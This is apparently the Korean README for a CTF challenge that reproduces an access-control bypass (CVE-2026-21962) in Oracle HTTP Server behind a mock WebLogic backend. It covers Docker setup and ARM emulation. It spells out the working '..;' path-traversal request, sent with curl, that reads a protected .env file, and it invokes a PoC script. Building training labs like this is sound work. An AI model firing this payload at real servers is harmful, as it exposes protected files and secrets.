# CVE-2026-21962 — OHS Access-Control Bypass CTF Challenge

> 윈스테크넷 9기 CTF 3차 — 도커 환경 구축 / 배정 포트 **10008**
> 대상: Oracle HTTP Server **12.2.1.4.0** (+ mod_wl_ohs 프록시 플러그인)

## 배포 정보 (운영진용 — GZCTF 입력값)
| 항목 | 값 |
|------|-----|
| 분류 | **공유(Shared)** — 읽기 전용 정보 노출(접근제어 우회), 서버 상태 변경 없음 |
| 외부 포트 | **10008** (프론트 OHS) · 내부: 7777(OHS), 7101(backend) |
| 이미지 | `cve-2026-21962-ohs-front`(외부 노출), `cve-2026-21962-backend`(내부 전용) |
| 메모리 | 컨테이너당 256MB |
| 플래그 | `WINS{...}` 형식, `GZCTF_FLAG` 또는 `FLAG` 환경변수 주입 (하드코딩 없음) |
| ⚠️ 아키텍처 | **x86-64 전용** (OHS 설치본이 x86 only). ARM 서버에선 아래 QEMU 에뮬레이션으로 구동. |

## ARM(Ampere) 서버 배포 — x86 에뮬레이션
OHS(프론트)만 x86 전용이라 ARM 호스트에서 **QEMU 에뮬레이션**으로 돌립니다.
공유 문제라 상시 컨테이너 1개뿐이라 부담이 작습니다. (백엔드는 ARM 네이티브로 동작)

ARM 호스트에서 **1회만** QEMU 등록:
```bash
docker run --privileged --rm tonistiigi/binfmt --install amd64
```
이후 `docker compose up -d` 하면 compose의 `platform: linux/amd64` 설정대로 OHS가 에뮬레이션으로 구동됩니다.
> 빌드도 ARM에서 하면 느리므로, x86 머신에서 빌드→`docker save`→ARM에서 `docker load` 가 더 빠릅니다.

## 빠른 검증 — 미리 빌드한 이미지 사용 (Oracle 설치본 불필요)
설치본이 없는 검증자/운영진은 **빌드한 이미지 .tar** 만 받으면 됩니다.

**(A) 이미지 만드는 쪽 — 설치본 있는 x86 PC에서 1회:**
```bash
# Windows: set FLAG=WINS{test_1234}   /   Linux·mac: export FLAG=WINS{test_1234}
docker compose up -d --build
docker save -o cve-2026-21962-images.tar cve-2026-21962-ohs-front cve-2026-21962-backend
```
→ 생성된 `.tar`(용량 큼)를 팀 내부로 전달. ※ Oracle 소프트웨어 포함 → 공개 업로드 금지, 내부 공유만.

**(B) 검증하는 쪽 — 설치본 없이:**
```bash
git clone https://github.com/2sangmin/Wins9_CVE_Practice.git
cd Wins9_CVE_Practice
docker load -i 경로/cve-2026-21962-images.tar
# ARM 서버면 1회: docker run --privileged --rm tonistiigi/binfmt --install amd64
set FLAG=WINS{test_1234}     # (Linux·mac: export FLAG=...)
docker compose up -d         # --build 없이: load한 이미지 그대로 사용
curl -i --path-as-is "http://localhost:10008/foo/..;/internal-admin/cont/.env"
```

## 취약점 한 줄 요약
OHS(프론트)와 백엔드가 `..;` 를 다르게 정규화해서, `<Location /internal-admin>` 차단을
우회(`/foo/..;/internal-admin/cont/.env`)해 보호 리소스에 접근하는
**접근제어 우회(CWE-284, CVSS 10.0)**.

## 구조 (컨테이너 2개)
```
[솔버] → :10008 → [ohs-front : 실제 취약 OHS 12.2.1.4.0]
                        │ (mod_wl_ohs, /foo → 프록시)
                        ▼ :7101 (내부)
                  [backend : 가벼운 모의 WebLogic]
                   └ /internal-admin/cont/.env 에 FLAG + X-ORACLE-DMS 헤더
```
- 바깥에 열리는 포트는 **10008 하나뿐** (backend 는 내부 전용)
- 컨테이너당 256m → 메모리 규칙 충족

## 폴더 구조
```
cve-2026-21962/
├── docker-compose.yml        # 2-서비스 (ohs-front + backend)
├── README.md / WRITEUP.md
├── .gitignore / .gitattributes
├── ohs/                      # 프론트 OHS (실제 취약 버전)
│   ├── Dockerfile            # OHS 12.2.1.4 사일런트 설치
│   ├── httpd.conf            # OHS 구동 + 취약 트리거(mod_wl_ohs /foo, /internal-admin 차단)
│   ├── entrypoint.sh         # httpd 포그라운드 기동 + 랜딩 페이지
│   └── (설치본 2개 여기 복사: fmw_..._ohs_linux64.bin, jdk-8u202...tar.gz)  ← gitignore
├── backend/                  # 가벼운 모의 백엔드 (파이썬 표준 라이브러리)
│   ├── Dockerfile
│   └── app.py                # /internal-admin/cont/.env 에 FLAG + X-ORACLE-DMS 헤더
└── exploit/
    ├── CVE-2026-21962.py     # 검증된 PoC
    └── README.md
```

## 빌드 전 준비
Oracle 계정으로 받은 설치본 2개를 `ohs/` 에 복사 (`.gitignore`로 커밋 차단됨):
- `fmw_12.2.1.4.0_ohs_linux64.bin`
- `jdk-8u202-linux-x64.tar.gz`

## 빌드 & 실행
실제 플래그는 **환경변수로만 주입** (파일/이미지에 하드코딩 없음 — 규칙3):

```bash
# Windows (CMD)
set FLAG=WINS{실제_플래그}
docker compose up -d --build

# Linux / macOS
FLAG='WINS{실제_플래그}' docker compose up -d --build
```

## 동작 확인 (A/B)
| 요청 | 결과 |
|------|------|
| `GET /` | 200 (안내 페이지) |
| `GET /internal-admin/cont/.env` | **404** (프론트 차단) |
| `GET /foo/..;/internal-admin/cont/.env` | **200 + FLAG 유출** (우회 성공) |

curl 로 바로 확인:
```bash
curl -i "http://localhost:10008/internal-admin/cont/.env"
curl -i --path-as-is "http://localhost:10008/foo/..;/internal-admin/cont/.env"
```
> `--path-as-is` 필수 (없으면 curl 이 `..` 를 먼저 정리해버려 우회가 성립하지 않음)

## 풀이 검증 (규칙8)
```bash
python3 exploit/CVE-2026-21962.py -t http://127.0.0.1:10008 --auto-proxy --check ALL
# => 보호된 .env 의 WINS{...} 가 유출되면 완료
```

## 상태
| 부분 | 상태 |
|------|------|
| OHS 프론트 (실제 취약 12.2.1.4.0) | ✅ 구동 확인 |
| 백엔드 (모의, X-ORACLE-DMS 헤더) | ✅ 완성·테스트 |
| compose / 포트 / 메모리 / 플래그 주입 | ✅ |
| exploit (검증 PoC) | ✅ |

## 제출 전 체크리스트
- [x] 바깥 포트 10008, 백엔드 내부 전용
- [x] 플래그 `WINS{...}`, 환경변수 주입, 실제 플래그/설치본 커밋 안 함
- [x] `privileged`/`docker.sock`/`/:/host` 미사용
- [x] 이미지 태그 고정, 런타임 외부 다운로드 없음
- [x] `docker compose up -d --build` 한 번에 기동
- [x] exploit 으로 플래그 획득 확인
- [ ] 깃허브 레포 URL 시트 작성 + [도커 제작 완료] 체크
